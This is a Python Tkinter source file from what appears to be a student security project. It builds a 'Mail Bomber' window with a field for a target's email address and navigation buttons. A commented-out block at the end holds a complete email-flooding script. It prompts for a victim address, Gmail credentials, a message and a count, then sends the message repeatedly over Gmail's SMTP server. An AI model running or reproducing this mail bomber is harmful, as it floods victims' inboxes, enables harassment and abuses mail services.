# Auteurs: Benjamin BEYERLE - Philippe DA SILVA OLIVEIRA - Karthike EZHILARASAN - Alexandre KOSTAS
# Classe: SRC1 - 3E
# Projet - ClicMed

import settings


def main_frame(root_frame, username, group):
    settings.login.clear_window(root_frame)
    root_frame.configure(background='#3c3f41')

    root_frame.title('Mail Bomber')
    root_frame.geometry('450x330')
    root_frame.maxsize(450, 330)
    root_frame.minsize(450, 330)

    filter10 = settings.tk.Label(root_frame, text='Email of target:', font=("Arial", 10), fg='white', bg='#3c3f41')
    filter10.grid(row=0, column=0, pady=2, sticky="w")



    return_btn = settings.tk.Button(root_frame, text='Return',
                                    command=lambda: settings.menu.main_frame(root_frame, username, group))
    return_btn.grid(row=2, column=3, sticky="se")

    exit_btn = settings.tk.Button(root_frame, text='Exit', command=root_frame.destroy)
    exit_btn.grid(row=2, column=4, sticky="sw")





# try:
#     bomb_email = input("Enter Email address on Whom you want to perfom this attack: ")
#     email = input("Enter your gmail_address:")
#     password = input("Enter your gmail_password:")
#     message = input("Enter Message:")
#     counter = int(input("How many message you want to send?:"))
#
#     for x in range(0, counter):
#         print("Number of Message Sent : ", x+1)
#         mail = settings.smtplib.SMTP('smtp.gmail.com',587)
#         mail.ehlo()
#         mail.starttls()
#         mail.login(email, password)
#         mail.sendmail(email, bomb_email, message)
#         settings.time.sleep(1)
#     mail.close()
# except Exception as e:
#     print("Something is wrong, please Re-try Again with Valid input.")

